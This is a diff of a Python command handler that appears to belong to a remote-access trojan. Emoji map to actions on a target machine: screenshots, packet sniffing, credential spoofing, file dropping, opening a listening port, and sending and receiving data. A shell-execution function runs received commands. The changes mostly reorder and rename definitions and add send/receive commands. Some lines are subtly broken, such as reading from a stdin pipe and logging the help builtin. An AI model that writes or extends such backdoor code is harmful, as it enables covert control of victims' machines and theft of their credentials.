@@ -15,12 +15,9 @@ from miscellaneous import *
 
 
 # Emoji to use as cmd
-open_port = "\U0001F44C"     # Open port to listen for connection        : ok
-ss = "\U0001F933"            # Take screenshot                           : selfie
 sniff = "\U0001F440"         # To sniff/capture packets on trgt machine  : eyes
-greddy = "\U0001F911"        # To spoof creds from trgt                  : money-mouth face
 drop = "\U0001F4A3"          # Dropping file/folder on trgt              : bomb
-scan = "\U0001F575"          # Scanning networks                         : detective
+
 
 door = "\U0001F6AA"          # Exiting                                   : door
 Help = "\U0001F914"          # help                                      : thinking face
@@ -28,6 +25,14 @@ file = "\U0001F4DD"          # file making/file                          : memo
 chng_direc = "\U0001F3CE"    # chnging directory                         : racing car
 remove  = "\U0001F6AE"       # removing                                  : litter in bin sign
 folder = "\U0001F4C1"        # folder					 : file folder
+
+ss = "\U0001F933"            # Take screenshot                           : selfie
+
+open_port = "\U0001F44C"     # Open port to listen for connection        : ok
+greddy = "\U0001F911"        # To spoof creds from trgt                  : money-mouth face
+send = "\U0001F4E4"          # sending data                              : outbox tray
+recv = "\U0001F4E5"          # receiving data                            : inbox tray
+
 
 # Help menu
 def help_menu():
@@ -41,11 +46,11 @@ def exit(cmd):
 		logger.info(f"{door}: Connection terminated!!")
 		break
 
-def help(cmd):
+def help_section(cmd):
 	# help section
 	if cmd == Help:
 		logger = logthis()
-		logger.info(f"{Help}: Showing Help menu")
+		logger.info(f"{help}: Showing Help menu")
 		Help = help_menu()
 		return Help
 
@@ -82,7 +87,7 @@ def cd(cmd):
 				return ""
 			else:
 				logger.error(f"{chng_direc}: No such directory named {cmd[11:]} is present")
-				
+
 		except Exception as e:
 			logger.error(f"Unable to Change Path to : {abs_path}")
 			logger.error(f"Error : {e}")
@@ -110,11 +115,14 @@ def rm_folder(cmd):
 def rm_file(cmd):
 	# Removing file
 	if cmd[:10] == remove and cmd.find(file) and len(cmd) > 1:
-
+		# Calling func from miscellaneous.py
 		rm(cmd[22:])
+
+
 
 def std_operation(cmd):
 	list_app = []
 	p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr = subprocess.PIPE)
+
 	list_app.extend([p.stdin.read(), p.stdout.read(), p.stderr.read()])
 	return list_app
